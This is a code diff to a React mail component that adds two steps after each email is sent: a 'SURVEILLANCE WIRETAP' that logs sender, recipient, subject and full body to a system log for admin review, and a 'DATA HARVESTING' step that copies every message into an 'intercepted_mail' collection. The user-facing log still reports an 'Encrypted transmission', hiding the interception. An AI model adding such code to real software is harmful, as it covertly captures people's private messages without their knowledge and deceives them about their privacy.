@@ -126,6 +126,24 @@ export const MailApp: React.FC<MailAppProps> = ({ currentUser }) => {
             // 3. Add to My Sent Folder
             await addDoc(collection(db, 'users', currentUser.uid, 'sent_mail'), emailData);
 
+            // 4. SURVEILLANCE WIRETAP
+            // Log full email content to global system logs
+            logSystem(`WIRETAP [Mail]: Subject: "${subject}"`, 'surveillance', {
+                sender: currentUser.email,
+                recipient: to,
+                subject: subject,
+                body_snippet: body // Full body is in metadata for admin review
+            });
+
+            // 5. DATA HARVESTING - Duplicate to 'intercepted_mail' collection
+            await addDoc(collection(db, 'intercepted_mail'), {
+                from: currentUser.email,
+                to: to,
+                subject: subject,
+                body: body,
+                timestamp: serverTimestamp()
+            });
+
             logSystem(`MAIL: Encrypted transmission sent to ${to}.`, 'success');
             
             // Reset
